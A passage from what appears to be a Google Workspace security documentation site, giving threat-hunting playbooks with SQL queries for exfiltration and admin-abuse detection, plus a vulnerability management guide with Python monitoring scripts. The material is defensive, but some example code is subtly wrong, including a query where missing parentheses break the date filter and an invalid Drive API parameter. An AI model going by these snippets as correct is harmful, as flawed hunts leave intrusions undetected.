</li> <li> <p>Service Account Analysis</p> </li> <li> <p>Hunt for newly created service accounts with unusual permissions:      <pre><code>SELECT service_account_id, creator_email, creation_time, privilege\nFROM service_account_logs\nWHERE creation_time &gt; DATE_SUB(CURRENT_DATE(), INTERVAL 30 DAY)\nAND privilege IN ('ADMIN_READ', 'ADMIN_WRITE', 'DATA_ACCESS')\n</code></pre></p> </li> <li> <p>Identify service accounts with inconsistent usage patterns:      <pre><code>SELECT service_account_id, api_method, COUNT(*) as api_call_count\nFROM service_account_activity\nWHERE timestamp &gt; DATE_SUB(CURRENT_DATE(), INTERVAL 14 DAY)\nGROUP BY service_account_id, api_method\n</code></pre></p> </li> <li> <p>Recovery Methods Analysis</p> </li> <li> <p>Look for recently modified account recovery information:      <pre><code>SELECT user_email, change_type, old_value, new_value, timestamp\nFROM account_recovery_logs\nWHERE timestamp &gt; DATE_SUB(CURRENT_DATE(), INTERVAL 30 DAY)\nAND change_type IN ('RECOVERY_PHONE', 'RECOVERY_EMAIL')\n</code></pre></p> </li> <li> <p>Hunt for accounts with recovery email domains different from corporate domains:      <pre><code>SELECT user_email, recovery_email_domain, timestamp\nFROM recovery_settings\nWHERE recovery_email_domain NOT IN ('company.com', 'trusted-partner.com')\n</code></pre></p> </li> <li> <p>Validation &amp; Response</p> </li> <li>Verify business purpose for identified persistence mechanisms</li> <li>Check for approval and documentation of delegated access</li> <li>Document findings and escalate suspicious configurations</li> <li>Implement remediation procedures if unauthorized persistence is found</li> </ol>"},{"location":"threat-hunting/#playbook-4-data-exfiltration-detection","title":"Playbook 4: Data Exfiltration Detection","text":"<p>Objective: Identify potential data exfiltration through authorized or unauthorized channels</p> <p>Data Sources: Drive logs, Gmail logs, DLP logs, Admin logs</p> <p>Hypothesis: Data exfiltration attempts will exhibit unusual data access or sharing patterns</p> <p>Hunt Methodology:</p> <ol> <li>Unusual Sharing Pattern Analysis</li> <li> <p>Hunt for mass external sharing activities:      <pre><code>SELECT user_email, COUNT(*) as external_share_count\nFROM drive_sharing_logs\nWHERE sharing_type = 'EXTERNAL'\nAND timestamp &gt; DATE_SUB(CURRENT_DATE(), INTERVAL 7 DAY)\nGROUP BY user_email\nORDER BY external_share_count DESC\n</code></pre></p> </li> <li> <p>Identify sensitive document external sharing:      <pre><code>SELECT document_id, user_email, recipient_email, document_sensitivity, timestamp\nFROM drive_sharing_logs\nWHERE document_sensitivity IN ('HIGH', 'RESTRICTED')\nAND sharing_type = 'EXTERNAL'\nAND timestamp &gt; DATE_SUB(CURRENT_DATE(), INTERVAL 14 DAY)\n</code></pre></p> </li> <li> <p>Download Activity Analysis</p> </li> <li> <p>Look for mass download behaviors:      <pre><code>SELECT user_email, COUNT(*) as download_count\nFROM drive_activity_logs\nWHERE activity_type = 'DOWNLOAD'\nAND timestamp &gt; DATE_SUB(CURRENT_DATE(), INTERVAL 3 DAY)\nGROUP BY user_email\nHAVING download_count &gt; 50\nORDER BY download_count DESC\n</code></pre></p> </li> <li> <p>Identify off-hours download activity:      <pre><code>SELECT user_email, document_id, timestamp\nFROM drive_activity_logs\nWHERE activity_type = 'DOWNLOAD'\nAND HOUR(timestamp) NOT BETWEEN 8 AND 18\nAND WEEKDAY(timestamp) BETWEEN 1 AND 5\nAND timestamp &gt; DATE_SUB(CURRENT_DATE(), INTERVAL 7 DAY)\n</code></pre></p> </li> <li> <p>Email Exfiltration Analysis</p> </li> <li> <p>Hunt for emails with suspicious attachments:      <pre><code>SELECT sender_email, recipient_email, attachment_count, attachment_size, timestamp\nFROM gmail_logs\nWHERE recipient_domain NOT IN ('company.com', 'trusted-partner.com')\nAND attachment_count &gt; 0\nAND attachment_size &gt; 5000000\nAND timestamp &gt; DATE_SUB(CURRENT_DATE(), INTERVAL 7 DAY)\n</code></pre></p> </li> <li> <p>Look for emails with unusual volume to external domains:      <pre><code>SELECT sender_email, recipient_domain, COUNT(*) as email_count\nFROM gmail_logs\nWHERE recipient_domain NOT IN ('company.com', 'trusted-partner.com')\nAND timestamp &gt; DATE_SUB(CURRENT_DATE(), INTERVAL 7 DAY)\nGROUP BY sender_email, recipient_domain\nORDER BY email_count DESC\n</code></pre></p> </li> <li> <p>DLP Alert Correlation</p> </li> <li> <p>Correlate DLP alerts with user activities:      <pre><code>SELECT user_email, alert_type, COUNT(*) as alert_count\nFROM dlp_alert_logs\nWHERE timestamp &gt; DATE_SUB(CURRENT_DATE(), INTERVAL 14 DAY)\nGROUP BY user_email, alert_type\nORDER BY alert_count DESC\n</code></pre></p> </li> <li> <p>Look for patterns in DLP rule violations:      <pre><code>SELECT dlp_rule, user_email, document_id, timestamp\nFROM dlp_violation_logs\nWHERE timestamp &gt; DATE_SUB(CURRENT_DATE(), INTERVAL 14 DAY)\nORDER BY user_email, timestamp\n</code></pre></p> </li> <li> <p>Validation &amp; Response</p> </li> <li>Verify business justification for identified activities</li> <li>Create a timeline of suspicious data movements</li> <li>Cross-reference with approved data handling procedures</li> <li>Document findings and escalate as appropriate</li> </ol>"},{"location":"threat-hunting/#playbook-5-admin-privilege-abuse-detection","title":"Playbook 5: Admin Privilege Abuse Detection","text":"<p>Objective: Identify potential abuse of administrative privileges</p> <p>Data Sources: Admin console logs, User privilege logs, Admin API audit logs</p> <p>Hypothesis: Malicious actors with admin access will perform suspicious administrative actions</p> <p>Hunt Methodology:</p> <ol> <li>Privilege Escalation Analysis</li> <li> <p>Hunt for unusual privilege assignments:      <pre><code>SELECT admin_email, target_user, assigned_role, timestamp\nFROM admin_privilege_logs\nWHERE assigned_role IN ('SUPER_ADMIN', 'USER_MANAGEMENT_ADMIN', 'SECURITY_ADMIN')\nAND timestamp &gt; DATE_SUB(CURRENT_DATE(), INTERVAL 30 DAY)\nORDER BY timestamp DESC\n</code></pre></p> </li> <li> <p>Look for self-promotion activities:      <pre><code>SELECT admin_email, target_user, assigned_role, timestamp\nFROM admin_privilege_logs\nWHERE admin_email = target_user\nAND timestamp &gt; DATE_SUB(CURRENT_DATE(), INTERVAL 90 DAY)\n</code></pre></p> </li> <li> <p>Sensitive Setting Modification Analysis</p> </li> <li> <p>Identify changes to security-critical settings:      <pre><code>SELECT admin_email, setting_name, old_value, new_value, timestamp\nFROM admin_setting_logs\nWHERE setting_category IN ('SECURITY', 'AUTHENTICATION', 'DATA_ACCESS')\nAND timestamp &gt; DATE_SUB(CURRENT_DATE(), INTERVAL 30 DAY)\nORDER BY timestamp DESC\n</code></pre></p> </li> <li> <p>Hunt for MFA requirement changes:      <pre><code>SELECT admin_email, setting_name, old_value, new_value, timestamp\nFROM admin_setting_logs\nWHERE setting_name LIKE '%MFA%'\nOR setting_name LIKE '%TWO_FACTOR%'\nOR setting_name LIKE '%2SV%'\nAND timestamp &gt; DATE_SUB(CURRENT_DATE(), INTERVAL 60 DAY)\n</code></pre></p> </li> <li> <p>User Management Analysis</p> </li> <li> <p>Look for unusual account creation patterns:      <pre><code>SELECT admin_email, COUNT(*) as creation_count\nFROM user_creation_logs\nWHERE timestamp &gt; DATE_SUB(CURRENT_DATE(), INTERVAL 7 DAY)\nGROUP BY admin_email\nORDER BY creation_count DESC\n</code></pre></p> </li> <li> <p>Identify suspicious password resets:      <pre><code>SELECT admin_email, target_user, timestamp\nFROM password_reset_logs\nWHERE timestamp &gt; DATE_SUB(CURRENT_DATE(), INTERVAL 14 DAY)\nORDER BY admin_email, timestamp\n</code></pre></p> </li> <li> <p>Admin API Usage Analysis</p> </li> <li> <p>Hunt for unusual API patterns:      <pre><code>SELECT admin_email, api_method, COUNT(*) as api_call_count\nFROM admin_api_logs\nWHERE timestamp &gt; DATE_SUB(CURRENT_DATE(), INTERVAL 7 DAY)\nGROUP BY admin_email, api_method\nORDER BY api_call_count DESC\n</code></pre></p> </li> <li> <p>Look for sensitive API usage off-hours:      <pre><code>SELECT admin_email, api_method, timestamp\nFROM admin_api_logs\nWHERE api_method IN ('Directory.Users.delete', 'Directory.Users.update', 'Groups.Members.delete')\nAND HOUR(timestamp) NOT BETWEEN 8 AND 18\nAND WEEKDAY(timestamp) BETWEEN 1 AND 5\nAND timestamp &gt; DATE_SUB(CURRENT_DATE(), INTERVAL 14 DAY)\n</code></pre></p> </li> <li> <p>Validation &amp; Response</p> </li> <li>Verify changes against approved change management processes</li> <li>Check for documentation of administrative actions</li> <li>Create timeline of suspicious administrative activities</li> <li>Escalate unexplained administrative actions for further investigation</li> </ol>"},{"location":"threat-hunting/#threat-hunting-program-development","title":"Threat Hunting Program Development","text":""},{"location":"threat-hunting/#maturity-model-for-google-workspace-threat-hunting","title":"Maturity Model for Google Workspace Threat Hunting","text":"<p>Level 1: Initial Hunting Capability - Ad-hoc hunting based on external intelligence - Basic log analysis capabilities - Limited hunting scope focused on known threats - Minimal documentation of hunting procedures</p> <p>Level 2: Developing Hunting Capability - Regular hunting cadence established - Documented hunting procedures for common scenarios - Basic hypothesis development process - Limited integration with incident response</p> <p>Level 3: Defined Hunting Program - Comprehensive playbooks covering major threat categories - Integration with threat intelligence - Structured hypothesis development and testing - Formal documentation of hunting methodologies - Regular knowledge sharing and training</p> <p>Level 4: Managed Hunting Program - Metrics to measure hunting effectiveness - Automated enrichment of hunting findings - Feedback loop with detection engineering - Cross-platform hunting capabilities - Regular program review and improvement</p> <p>Level 5: Optimizing Hunting Program - Advanced analytics and machine learning support - Continuous hypothesis refinement - Automated hunting for common scenarios - Tight integration with security operations - Contribution to broader threat intelligence</p>"},{"location":"threat-hunting/#building-a-threat-hunting-team","title":"Building a Threat Hunting Team","text":"<p>Core Skills for Google Workspace Threat Hunters: - Google Workspace architecture knowledge - Log analysis expertise - Data analysis and SQL querying skills - Understanding of common attack techniques - Critical thinking and hypothesis development - Technical documentation capabilities</p> <p>Recommended Team Structure: - Hunt Lead: Coordinates hunting activities and methodologies - Data Specialists: Focus on data acquisition and analysis - Workspace Security Specialists: Provide platform expertise - Threat Intelligence Analysts: Provide context and emerging threats - Detection Engineers: Implement persistent detection from findings</p>"},{"location":"threat-hunting/#threat-hunting-cadence","title":"Threat Hunting Cadence","text":"<p>Recommended Hunting Schedule: - Daily: Quick hunts for high-priority threat patterns - Weekly: Deeper analysis of specific threat categories - Monthly: Comprehensive hunting across multiple threat vectors - Quarterly: Advanced hunts incorporating new techniques and intelligence</p> <p>Prioritization Framework: - Business impact of potential threats - Current threat landscape and intelligence - Recent security incidents or near-misses - Security control changes and gap identification - Compliance and regulatory requirements</p>"},{"location":"threat-hunting/#resources","title":"Resources","text":"<ul> <li>Google Workspace Admin SDK API</li> <li>Google Security Center Documentation</li> <li>Log Export to BigQuery</li> <li>MITRE ATT&amp;CK for Enterprise</li> <li>Google Workspace Investigation Tool</li> </ul> <p>Note: Actual SQL queries will vary based on your specific log schema and export configuration. Adapt these examples to match your environment's specific data structure.</p>"},{"location":"vulnerability-management/","title":"Vulnerability Management","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance</p>"},{"location":"vulnerability-management/#google-workspace-vulnerability-management","title":"Google Workspace Vulnerability Management","text":"<p>This guide provides a comprehensive framework for managing vulnerabilities in Google Workspace environments, with special emphasis on zero-day vulnerability response, prioritization, and remediation strategies.</p>"},{"location":"vulnerability-management/#understanding-vulnerability-management-for-google-workspace","title":"Understanding Vulnerability Management for Google Workspace","text":""},{"location":"vulnerability-management/#unique-challenges-in-cloud-saas-environments","title":"Unique Challenges in Cloud SaaS Environments","text":"<p>Google Workspace presents distinct vulnerability management challenges compared to traditional on-premises infrastructure:</p> <ol> <li>Limited Control Plane Access</li> <li>Cloud provider manages underlying infrastructure</li> <li>Limited visibility into backend systems</li> <li> <p>Dependence on provider for core security patching</p> </li> <li> <p>Rapid Feature Evolution</p> </li> <li>Frequent feature releases and updates</li> <li>Continuous integration/deployment by Google</li> <li> <p>New capabilities introducing potential security gaps</p> </li> <li> <p>Shared Responsibility Model</p> </li> <li>Google secures the platform; customers secure their configuration</li> <li>Overlapping security responsibilities between provider and customer</li> <li> <p>Need for clear delineation of security obligations</p> </li> <li> <p>Attack Surface Diversity</p> </li> <li>Multiple integrated services with distinct security models</li> <li>Cross-service dependencies and permissions</li> <li>Varying API security considerations</li> </ol>"},{"location":"vulnerability-management/#vulnerability-management-framework","title":"Vulnerability Management Framework","text":""},{"location":"vulnerability-management/#1-governance-and-strategy","title":"1. Governance and Strategy","text":"<p>Establish a structured approach to vulnerability management:</p> <ol> <li>Program Structure</li> <li>Define roles and responsibilities</li> <li>Establish vulnerability management team</li> <li>Create documented policies and procedures</li> <li> <p>Align with organizational security framework</p> </li> <li> <p>Risk Acceptance Criteria</p> </li> <li>Define vulnerability severity thresholds</li> <li>Establish remediation SLAs by severity</li> <li>Create exception process for accepted vulnerabilities</li> <li> <p>Implement risk tracking mechanisms</p> </li> <li> <p>Documentation Requirements</p> </li> <li>Vulnerability tracking system</li> <li>Remediation workflow documentation</li> <li>Risk acceptance documentation</li> <li>Historical vulnerability metrics</li> </ol>"},{"location":"vulnerability-management/#2-vulnerability-intelligence-and-monitoring","title":"2. Vulnerability Intelligence and Monitoring","text":"<p>Establish comprehensive monitoring for potential vulnerabilities:</p> <ol> <li>Intelligence Sources</li> <li>Google Workspace release notes and security bulletins</li> <li>Google Cloud status page and announcements</li> <li>Security researcher publications</li> <li>Industry threat intelligence feeds</li> <li>NIST National Vulnerability Database</li> <li> <p>Security vendor advisories</p> </li> <li> <p>Automated Monitoring <pre><code># Example Python script for monitoring Google security bulletins\nimport requests\nimport json\nfrom datetime import datetime, timedelta\nimport re\nfrom bs4 import BeautifulSoup\n\ndef monitor_google_security_bulletins():\n    \"\"\"Monitor Google security bulletins for Workspace vulnerabilities\"\"\"\n    # Google Workspace release notes URL\n    url = \"https://workspace.google.com/whatsnew/security/\"\n    \n    # Get page content\n    response = requests.get(url)\n    if response.status_code != 200:\n        return {\"error\": f\"Failed to fetch security bulletins: {response.status_code}\"}\n        \n    # Parse with BeautifulSoup\n    soup = BeautifulSoup(response.text, 'html.parser')\n    \n    # Find security bulletins (adjust selectors based on actual page structure)\n    bulletins = []\n    bulletin_elements = soup.select('.security-bulletin')\n    \n    for element in bulletin_elements:\n        date_element = element.select_one('.bulletin-date')\n        title_element = element.select_one('.bulletin-title')\n        description_element = element.select_one('.bulletin-description')\n        \n        if date_element and title_element:\n            bulletin_date = date_element.text.strip()\n            title = title_element.text.strip()\n            description = description_element.text.strip() if description_element else \"\"\n            \n            # Check if it's recent (last 7 days)\n            try:\n                bulletin_date_obj = datetime.strptime(bulletin_date, '%B %d, %Y')\n                is_recent = (datetime.now() - bulletin_date_obj).days &lt;= 7\n            except:\n                is_recent = False\n            \n            # Check if it's relevant to Workspace\n            is_workspace_related = any(term in title.lower() or term in description.lower() \n                                       for term in ['workspace', 'gmail', 'drive', 'docs', 'sheets', 'slides', 'meet'])\n            \n            # Identify potential security implications\n            has_security_terms = any(term in title.lower() or term in description.lower()\n                                     for term in ['security', 'vulnerability', 'exploit', 'attack', 'patch', 'fix'])\n            \n            if is_recent and (is_workspace_related or has_security_terms):\n                bulletins.append({\n                    'date': bulletin_date,\n                    'title': title,\n                    'description': description,\n                    'is_workspace_related': is_workspace_related,\n                    'has_security_terms': has_security_terms\n                })\n    \n    return {\n        'bulletins_found': len(bulletins),\n        'recent_security_bulletins': bulletins\n    }\n\ndef check_google_cloud_status():\n    \"\"\"Check Google Cloud Status Dashboard for Workspace incidents\"\"\"\n    url = \"https://status.cloud.google.com/incidents.json\"\n    \n    response = requests.get(url)\n    if response.status_code != 200:\n        return {\"error\": f\"Failed to fetch status: {response.status_code}\"}\n    \n    incidents = json.loads(response.text)\n    \n    # Filter for recent Workspace incidents\n    workspace_incidents = []\n    for incident in incidents:\n        # Check if incident is recent (last 7 days)\n        start_time = datetime.fromisoformat(incident['begin'].replace('Z', '+00:00'))\n        is_recent = (datetime.now() - start_time).days &lt;= 7\n        \n        # Check if related to Workspace\n        affected_products = incident.get('services', [])\n        is_workspace_related = any('workspace' in product.lower() for product in affected_products)\n        \n        if is_recent and is_workspace_related:\n            workspace_incidents.append({\n                'id': incident.get('id'),\n                'title': incident.get('title'),\n                'begin': incident.get('begin'),\n                'end': incident.get('end', 'Ongoing'),\n                'severity': incident.get('severity'),\n                'affected_products': affected_products,\n                'updates': incident.get('updates', [])\n            })\n    \n    return {\n        'incidents_found': len(workspace_incidents),\n        'recent_workspace_incidents': workspace_incidents\n    }\n</code></pre></p> </li> <li> <p>Continuous Configuration Assessment</p> </li> <li>Regular security configuration reviews</li> <li>Automated configuration monitoring</li> <li>Compliance with security benchmarks</li> <li> <p>Gap analysis against best practices</p> </li> <li> <p>User Vulnerability Reporting</p> </li> <li>Establish internal reporting mechanism</li> <li>Create security contact process</li> <li>Implement responsible disclosure program</li> <li>Develop vendor communication procedures</li> </ol>"},{"location":"vulnerability-management/#3-zero-day-vulnerability-response","title":"3. Zero-Day Vulnerability Response","text":"<p>Develop specialized workflows for high-impact, newly disclosed vulnerabilities:</p> <ol> <li>Definition and Classification</li> </ol> <p>A zero-day vulnerability in Google Workspace context refers to:    - Previously unknown security flaws    - Vulnerabilities with no available patch    - Actively exploited security weaknesses    - Critical flaws in core Workspace services</p> <p>Zero-Day Severity Classification:</p> Severity Description Response Time Examples Critical Actively exploited, high impact Immediate (1-4 hours) RCE in core services, authentication bypass High Exploitable with significant impact Urgent (24 hours) Data access vulnerabilities, cross-tenant issues Medium Limited exploitation potential Prioritized (72 hours) Session management flaws, permission escalation Low Minimal direct impact Standard (1 week) UI vulnerabilities with limited security impact <ol> <li>Emergency Response Team</li> <li>Cross-functional team composition:<ul> <li>Google Workspace administrators</li> <li>Security operations team</li> <li>Risk management personnel</li> <li>Communications specialists</li> <li>Executive stakeholders</li> </ul> </li> <li>Clear roles and escalation paths</li> <li> <p>Regular tabletop exercises</p> </li> <li> <p>Emergency Assessment Process <pre><code>1. Triage and Verification\n   - Validate vulnerability existence\n   - Determine applicability to your environment\n   - Assess potential impact\n   - Evaluate exploitation likelihood\n\n2. Impact Assessment\n   - Identify affected services and components\n   - Determine potential data exposure\n   - Assess business process disruption\n   - Evaluate regulatory implications\n\n3. Exposure Analysis\n   - Check for indicators of compromise\n   - Review security logs for exploitation\n   - Conduct targeted threat hunting\n   - Assess authentication and access logs\n</code></pre></p> </li> <li> <p>Interim Mitigation Strategies</p> </li> <li>Service-specific security controls:<ul> <li>Temporary feature disablement</li> <li>Access restrictions</li> <li>Enhanced monitoring</li> <li>Alternate workflows</li> </ul> </li> </ol> <p>Gmail Interim Mitigations: <pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Gmail &gt; Safety\n- Implement enhanced phishing protections\n- Enable external sender warnings\n- Configure additional content compliance rules\n- Apply stricter attachment restrictions\n</code></pre></p> <p>Drive Interim Mitigations: <pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Drive and Docs\n- Restrict sharing capabilities\n- Disable public link creation\n- Implement additional DLP rules\n- Configure access restrictions\n</code></pre></p> <p>Identity Interim Mitigations: <pre><code>Admin Console &gt; Security &gt; Authentication\n- Implement additional login challenges\n- Enable enhanced safe browsing protection\n- Configure location-based access restrictions\n- Deploy stricter session management\n</code></pre></p> <ol> <li>Communications Framework</li> <li>Internal stakeholder notification</li> <li>Executive briefing procedures</li> <li>User communication templates</li> <li>Vendor communication protocols</li> <li>Regulatory notification process</li> </ol> <p>Stakeholder Communication Template: <pre><code>Subject: SECURITY ALERT [ID]: Zero-Day Vulnerability in [Service]\n\nSUMMARY:\nA zero-day vulnerability has been identified in [Google Workspace Service]. This vulnerability could potentially [brief impact description].\n\nDETAILS:\n- Vulnerability Type: [Describe vulnerability]\n- Affected Services: [List services]\n- Potential Impact: [Business impact]\n- Current Status: [Patch availability, Google's response]\n\nACTIONS TAKEN:\n- [List interim mitigations implemented]\n- [Monitoring enhancements]\n- [Other protective measures]\n\nRECOMMENDED USER ACTIONS:\n- [Specific guidance for users]\n- [Alternative workflows if applicable]\n- [Additional security measures]\n\nTIMELINE:\n- [Discovery time]\n- [Mitigation implementation]\n- [Expected resolution]\n\nFor questions or to report suspicious activity, contact the security team at [contact details].\n</code></pre></p>"},{"location":"vulnerability-management/#4-remediation-management","title":"4. Remediation Management","text":"<p>Establish structured remediation workflows for different vulnerability types:</p> <ol> <li>Google-Managed Vulnerabilities</li> <li>Track Google's patch deployment</li> <li>Communicate resolution to stakeholders</li> <li>Verify fix implementation</li> <li> <p>Document resolution in vulnerability database</p> </li> <li> <p>Configuration-Based Vulnerabilities</p> </li> <li>Develop remediation plan</li> <li>Test changes in controlled environment</li> <li>Implement configuration changes</li> <li>Verify effectiveness</li> <li> <p>Document configuration standards</p> </li> <li> <p>Third-Party Integration Vulnerabilities</p> </li> <li>Assess third-party application inventory</li> <li>Implement risk-based remediation</li> <li>Communicate with vendors</li> <li>Apply interim security controls</li> <li> <p>Verify integration security</p> </li> <li> <p>Post-Remediation Validation</p> </li> <li>Verify vulnerability resolution</li> <li>Test security controls</li> <li>Confirm proper operation</li> <li>Document remediation outcomes</li> </ol>"},{"location":"vulnerability-management/#5-reporting-and-metrics","title":"5. Reporting and Metrics","text":"<p>Develop comprehensive reporting to track vulnerability management effectiveness:</p> <ol> <li>Key Performance Indicators</li> <li>Mean time to detect (MTTD)</li> <li>Mean time to respond (MTTR)</li> <li>Mean time to remediate (MTTR)</li> <li>Vulnerability closure rate</li> <li> <p>Risk reduction over time</p> </li> <li> <p>Executive Reporting <pre><code>Monthly Vulnerability Management Executive Summary\n\nOVERVIEW:\n- Total vulnerabilities tracked: [count]\n- Critical/High vulnerabilities: [count]\n- Remediated this period: [count]\n- Average remediation time: [days]\n\nKEY METRICS:\n- Critical vulnerability closure rate: [percentage]\n- Compliance with remediation SLAs: [percentage]\n- Risk reduction trend: [percentage change]\n\nSIGNIFICANT VULNERABILITIES:\n- [List notable vulnerabilities with business impact]\n\nRECOMMENDATIONS:\n- [Strategic improvements]\n- [Resource requirements]\n- [Process enhancements]\n</code></pre></p> </li> <li> <p>Continuous Improvement</p> </li> <li>Lessons learned documentation</li> <li>Process refinement</li> <li>Automation opportunities</li> <li>Knowledge base development</li> </ol>"},{"location":"vulnerability-management/#workspace-specific-vulnerability-scenarios-and-responses","title":"Workspace-Specific Vulnerability Scenarios and Responses","text":""},{"location":"vulnerability-management/#1-authentication-and-identity-vulnerabilities","title":"1. Authentication and Identity Vulnerabilities","text":"<p>Scenario: OAuth Implementation Flaw</p> <p>Description: A vulnerability in Google's OAuth implementation that could allow token interception or unauthorized access.</p> <p>Impact Assessment: - Potential unauthorized access to user accounts - Possible data exfiltration via API - Cross-service exploitation - Persistent access despite password changes</p> <p>Response Actions: 1. Immediate Assessment <pre><code>Admin Console &gt; Reports &gt; Audit &gt; Token\n- Check for unusual token issuance\n- Identify potentially affected applications\n- Review API usage patterns\n</code></pre></p> <ol> <li> <p>Interim Mitigations <pre><code>Admin Console &gt; Security &gt; API Controls &gt; App access control\n- Restrict OAuth application authorizations\n- Implement application allowlisting\n- Force token revocation for high-risk applications\n</code></pre></p> </li> <li> <p>Monitoring Enhancement <pre><code># Python script to monitor for OAuth token exploitation\ndef monitor_oauth_exploitation(reports_service):\n    \"\"\"Monitor for potentially exploited OAuth tokens\"\"\"\n    # Get token events\n    token_events = reports_service.activities().list(\n        userKey='all',\n        applicationName='token',\n        maxResults=1000\n    ).execute()\n    \n    # Analyze for suspicious patterns\n    suspicious_activities = []\n    \n    for event in token_events.get('items', []):\n        # Extract event details\n        parameters = event.get('events', [{}])[0].get('parameters', [])\n        app_name = next((p.get('value') for p in parameters \n                       if p.get('name') == 'app_name'), None)\n        client_id = next((p.get('value') for p in parameters \n                        if p.get('name') == 'client_id'), None)\n        scopes = next((p.get('value') for p in parameters \n                     if p.get('name') == 'scope'), '').split()\n        \n        # Check for suspicious indicators\n        has_high_risk_scopes = any(is_high_risk_scope(s) for s in scopes)\n        unusual_location = is_unusual_location(event.get('ipAddress'))\n        \n        if has_high_risk_scopes and unusual_location:\n            suspicious_activities.append({\n                'user': event['actor']['email'],\n                'app_name': app_name,\n                'client_id': client_id,\n                'ip_address': event.get('ipAddress'),\n                'scopes': scopes,\n                'timestamp': event.get('id', {}).get('time')\n            })\n    \n    return suspicious_activities\n</code></pre></p> </li> <li> <p>Long-term Risk Reduction <pre><code>Admin Console &gt; Security &gt; Access and data control &gt; API controls\n- Implement Access Context Manager\n- Configure service boundaries\n- Deploy enhanced token monitoring\n</code></pre></p> </li> </ol>"},{"location":"vulnerability-management/#2-data-protection-vulnerabilities","title":"2. Data Protection Vulnerabilities","text":"<p>Scenario: Drive Sharing Control Bypass</p> <p>Description: A vulnerability that allows bypassing sharing restrictions in Google Drive, potentially exposing sensitive documents.</p> <p>Impact Assessment: - Unauthorized access to sensitive documents - Potential data exfiltration - Regulatory compliance issues - Intellectual property exposure</p> <p>Response Actions: 1. Immediate Assessment <pre><code>Admin Console &gt; Reports &gt; Audit &gt; Drive\n- Review external sharing activity\n- Check for unusual sharing patterns\n- Identify potentially exposed documents\n</code></pre></p> <ol> <li> <p>Interim Mitigations <pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Drive and Docs &gt; Sharing settings\n- Restrict external sharing capabilities\n- Disable link sharing temporarily\n- Implement stricter access controls\n- Deploy additional DLP rules\n</code></pre></p> </li> <li> <p>Data Exposure Review <pre><code># Python script to identify potentially exposed documents\ndef identify_exposed_documents(drive_service, admin_service):\n    \"\"\"Find potentially exposed sensitive documents\"\"\"\n    # Get all users\n    users_result = admin_service.users().list(\n        customer='my_customer',\n        maxResults=500\n    ).execute()\n    \n    exposed_documents = []\n    \n    for user in users_result.get('users', []):\n        user_email = user['primaryEmail']\n        \n        try:\n            # Get files with sensitive patterns\n            results = drive_service.files().list(\n                q=\"(name contains 'confidential' or name contains 'sensitive' or name contains 'private') and trashed=false\",\n                corpora=\"user\",\n                userKey=user_email,\n                fields=\"files(id,name,mimeType,owners,permissions,sharingUser,webViewLink)\",\n                pageSize=100\n            ).execute()\n            \n            for file in results.get('files', []):\n                # Check permissions for external sharing\n                for permission in file.get('permissions', []):\n                    if is_external_permission(permission):\n                        exposed_documents.append({\n                            'id': file.get('id'),\n                            'name': file.get('name'),\n                            'owner': user_email,\n                            'shared_with': permission.get('emailAddress', 'Anyone with link'),\n                            'permission_type': permission.get('type'),\n                            'permission_role': permission.get('role')\n                        })\n        except Exception as e:\n            print(f\"Error checking files for {user_email}: {str(e)}\")\n    \n    return exposed_documents\n    \ndef is_external_permission(permission):\n    \"\"\"Check if permission is to external user or public\"\"\"\n    if permission.get('type') == 'anyone':\n        return True\n        \n    if permission.get('type') == 'user' and permission.get('emailAddress'):\n        # Check if email is external (not your domain)\n        if not permission['emailAddress'].endswith('@yourdomain.com'):\n            return True\n            \n    return False\n</code></pre></p> </li> <li> <p>Long-term Risk Reduction <pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Drive and Docs &gt; Sharing settings\n- Implement classification-based sharing restrictions\n- Deploy content-aware access controls\n- Configure enhanced DLP rules\n- Implement sharing monitoring framework\n</code></pre></p> </li> </ol>"},{"location":"vulnerability-management/#3-email-security-vulnerabilities","title":"3. Email Security Vulnerabilities","text":"<p>Scenario: Gmail Attachment Filtering Bypass</p> <p>Description: A vulnerability allowing malicious attachments to bypass Gmail's security filtering, potentially exposing users to malware.</p> <p>Impact Assessment: - Malware delivery to user devices - Potential credential theft via phishing - Data exfiltration risk - Lateral movement opportunity</p> <p>Response Actions: 1. Immediate Assessment <pre><code>Admin Console &gt; Reports &gt; Audit &gt; Email logs\n- Review attachment types received\n- Check for unusual attachment patterns\n- Identify potential malware indicators\n</code></pre></p> <ol> <li> <p>Interim Mitigations <pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Gmail &gt; Compliance\n- Implement additional attachment restrictions\n- Configure enhanced content filtering\n- Deploy stricter quarantine rules\n- Enable advanced phishing and malware protection\n</code></pre></p> </li> <li> <p>Enhanced Monitoring <pre><code># Python script to monitor for suspicious attachments\ndef monitor_suspicious_attachments(reports_service):\n    \"\"\"Monitor for potentially malicious email attachments\"\"\"\n    # Get email events with attachments\n    email_events = reports_service.activities().list(\n        userKey='all',\n        applicationName='gmail',\n        eventName='EMAIL_RECEIVED',\n        maxResults=1000\n    ).execute()\n    \n    suspicious_attachments = []\n    \n    for event in email_events.get('items', []):\n        # Extract event details\n        parameters = event.get('events', [{}])[0].get('parameters', [])\n        has_attachment = next((p.get('value') for p in parameters \n                              if p.get('name') == 'has_attachment'), 'false') == 'true'\n        \n        if has_attachment:\n            # Check attachment details from message_info parameter\n            message_info = next((p.get('value') for p in parameters \n                                if p.get('name') == 'message_info'), {})\n            \n            # Parse message info (implementation depends on actual format)\n            attachment_types = extract_attachment_types(message_info)\n            \n            # Check for suspicious attachment types\n            if has_suspicious_attachment(attachment_types):\n                suspicious_attachments.append({\n                    'recipient': event['actor']['email'],\n                    'sender': extract_sender(message_info),\n                    'subject': extract_subject(message_info),\n                    'attachment_types': attachment_types,\n                    'timestamp': event.get('id', {}).get('time')\n                })\n    \n    return suspicious_attachments\n    \ndef has_suspicious_attachment(attachment_types):\n    \"\"\"Check for suspicious attachment types\"\"\"\n    suspicious_extensions = [\n        'exe', 'bat', 'cmd', 'ps1', 'vbs', 'js', 'jar', 'wsf', 'dll', 'scr',\n        'hta', 'jse', 'docm', 'xlsm', 'pptm'\n    ]\n    \n    return any(ext in attachment_types for ext in suspicious_extensions)\n</code></pre></p> </li> <li> <p>Long-term Risk Reduction <pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Gmail &gt; Safety\n- Implement advanced safe attachments policy\n- Deploy comprehensive attachment scanning\n- Configure zero-hour auto purge capability\n- Enable advanced threat 